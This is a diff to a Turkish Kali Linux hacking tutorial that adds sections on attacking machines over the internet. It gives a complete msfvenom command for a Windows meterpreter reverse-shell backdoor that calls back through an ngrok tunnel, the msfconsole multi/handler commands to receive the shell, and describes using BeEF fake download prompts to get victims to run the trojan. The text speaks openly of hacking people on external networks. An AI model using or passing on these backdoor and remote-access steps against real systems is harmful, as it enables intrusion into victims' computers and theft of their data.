@@ -93,6 +93,12 @@
     - [Diyalog Çıkartmak](#diyalog-çıkartmak)
     - [Bilgileri Çalmak (Pretty Thieft)](#bilgileri-çalmak-pretty-thieft)
     - [Backdoor İletmek](#backdoor-i̇letmek)
+- [Dış Ağda Backdoor ve Tünel Servisleri](#dış-ağda-backdoor-ve-tünel-servisleri)
+  - [Dış Ağ Saldırı Çeşitleri](#dış-ağ-saldırı-çeşitleri)
+  - [Port Forwarding Saldırıları](#port-forwarding-saldırıları)
+  - [Tunneling (Tünel Servisi) Nedir](#tunneling-tünel-servisi-nedir)
+  - [Msfvenom](#msfvenom)
+    - [Dinleyiciyi Çalıştıralım](#dinleyiciyi-çalıştıralım)
 
 # Giriş
 Bu döküman **Linux** işletim sisteminin **Kali Linux** dağıtımı üzerinde hazırlanmıştır. İlgili sistem bilgileri aşağıda bulunmaktadır.<br>
@@ -1113,4 +1119,76 @@ Socail Engineering > Fake Notification Bar(ilgili browser) giderek bu event'i ç
  Beef Panel'de URL kısmına trojanımız web sunucudaki adresini(kendi IP adresim/trojan_path) giriyorum, bu sayede hedef indir butonuna basınca ilgili adresten trojan indirilmiş olacak. Text kısmında da gösterilmesini istediğim text'i set edip execute ediyorum ve kullanıcıya bir uyarı çıkıyor, indir butonuna bastığı an trojanımızı indirmiş oluyor. Hedef dosyayı çalıştırdığı an [msfconsole multi handler](#multi-handler-oluşturmak) ile açılan bağlantıyı dinlemeye başlıyoruz.
 
  ![Beef Exploit](./assets/57-beef-exploit.png)
+
+# Dış Ağda Backdoor ve Tünel Servisleri
+## Dış Ağ Saldırı Çeşitleri
+Dış ağlarda 2 yöntem ile saldırı yapabiliriz.<br>
+1-) Port Forwarding (Port Yönlendirme) 
+- Bir trojan oluşturuyoruz ve Public IP adresimize yönlendiriyoruz. Ardından belirlediğimiz Portta multi handler çalıştırıp gelen bağlantıyı yakalıyoruz. (veil - msfcoonsole)
+<br> <br>
+
+2-) Tunneling (Tünel Servisleri) 
+- Bize bir IP adresi verilir (ngrok vb.). 
+- Bağlantıyı Kurban makinadan bu bize verilen IP adresine yönlendiriyoruz. 
+- Tünel servisi de gelen bağlantıyı bize yönlendiriyor. 
+- Bizde Kali makinamızdan bu bağlantıyı yakalıyoruz. 
+- Bu işleme Tunneling denmektedir. 
+<br>
+
+## Port Forwarding Saldırıları
+Aslında bu işlemi üst başlıklarda yapmıştık. Tek fark orada aynı ağdayken local IP'mizi LHOST olarak set ediyorduk. Eğer Public IP adresimizi set edersek kurbanlar bizim Public IP adresimiz üzerinden bağlantı açacaklar ve bu sayede dış ağdaki insanları hackleyebileceğiz
+
+## Tunneling (Tünel Servisi) Nedir
+Localimizdeki sunucuları İnternet'e açmamızı sağlar. <br>
+Biz tünel servisi olarak [ngrok](https://ngrok.com/) kullanacağız. 
+- Bu servisi kullanmak için ngrok'a kayıt olmamız gerekmektedir.
+- Kayıt oldultan sonra giriş yapıyoruz ve ngrok'u indiriyoruz.
+- ngrok tarafından bize bir token veriliyor, bu sayede **yaptığımız işlemler ngrok tarafından kontrol edilebiliyor**
+- İndirdiğimiz dosyayı zip'ten çıkartıyoruz
+- `./ngrok <TOKEN>` komutunu çalıştırıyoruz ve authenticate oluyoruz
+```
+>>> Authtoken saved to configuration file: /root/.ngrok2/ngrok.yml
+```
+- Artık `./ngrok` yazarak programı çalıştırabiliriz
+- `./ngrok help` ile yardım menüsünü açabiliriz
+- `./ngrok tcp 4242` komutu ile 4242 portunda tcp tünel servisi çalıştırıyoruz. Port numarası bize kalmıştır, çok kullanılmayan portları kullanabiliriz
+
+![ngrok tcp service](./assets/58-ngrok-servis.png)
+
+- Bize diyorki `Forwarding tcp://0.tcp.ngrok.io:17651 -> localhost:4242`
+- Yani `tcp://0.tcp.ngrok.io:17651` bu adrese istek geldiğinde ben bunu senin `localhost:4242` adresine yönlendireceğim diyor (bu adresler de kişiden kişiye değişebilir :innocent: )
+
+## Msfvenom
+Msfvenom'da [Veil](#veil)'a alternatif olabilecek bir backdoor oluşturma aracıdır. 
+- `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows lhost=0.tcp.ngrok.io lport=17651 -f exe -o /var/www/html/backdoorum.exe`
+- `-p` parametresi oluşturduğumuz backdoor'un(payload) türü
+- `-a` architecture yani hedef mimariyi belirttiğimiz yer
+- `--platform` hedef platformumuz
+- `lhost` ngrok tarafından bize verilen adres
+- `lport` ngrok tarafından bize verilen port
+- `-f` oluşturulacak dosyanın uzantısı
+- `-o` oluşturulan backdoor nereye kaydedilecek
+- Yine unutmamakta fayda var, bu parametreler makinadan makinaya değişebilmektedir :innocent:
+```
+# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows lhost=0.tcp.ngrok.io lport=17651 -f exe -o /var/www/html/backdoorum.exe
+```
+### Dinleyiciyi Çalıştıralım
+[Üst başlıklarda da yaptığımız gibi](#multi-handler-oluşturmak) multi handler oluşturacağız
+- `msfconsole`
+- `use exploit/multi/handler`
+- `set PAYLOAD windows/meterpreter/reverse_tcp`
+- `set LHOST 0.0.0.0` ile localhost bağlantımızı dinleyeceğiz. ngrok kendisine gelen bağlantıyı bize yönlendirecek
+- `set LPORT 4242` ile ngrok'un bağlantıyı yönlendirdiği portu set ediyoruz
+- `exploit` ile exploit'i çalıştırıyoruz
+
+![msfconsole multi handler](./assets/59-msf-confs.png)
+
+- Adres çubuğuna kali cihazımızın IP adresini yazıyoruz ve Kali üzerinde oluşturduğumuz web sunucudan trojan'ı indiriyoruz
+- Trojan çalıştırıldığında bağlantı ngrok üzerinden bize geliyor
+
+![ngrok multi handler](./assets/60-ngrok-multi-handler.png)
+
+- Kali makinamızda `msfconsole` yardımı ile bağlantıyı dinliyoruz ve hayırlı olsun artık hedef makinayı ele geçirdik
+
+![ngrok msfconsole](./assets/61-ngrok-msfconsole.png)
 
